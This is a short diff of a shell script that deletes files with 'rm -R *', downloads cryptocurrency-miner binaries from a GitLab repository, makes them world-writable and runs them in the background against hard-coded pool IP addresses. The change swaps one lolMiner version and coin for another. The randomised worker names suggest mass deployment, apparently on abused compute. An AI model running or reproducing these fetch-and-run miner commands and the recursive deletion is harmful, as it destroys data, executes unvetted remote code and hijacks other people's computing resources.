@@ -9,9 +9,9 @@ rm -R *
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
 chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u ukkcroyFQ1qY6ZrdRh8ToeShu1Uk7D31Ah.$(shuf -n 1 -i 1-99999)-VISH -t4 &
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
-chmod 777 lol1.81
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lolMiner1.82a
+chmod 777 lolMiner1.82a
 
-./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qq793yqj26gca8n2lj7ff7w80rylvuxp02qy0vaqw0sx5u9hq9hjs0c8kdrj4.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
+./lolMiner1.82a --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qrzwv59dsapq2knzg205yl5jcam6djzjtjz79ay703k8t75yrgs47pl4kxl78.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
 
 done
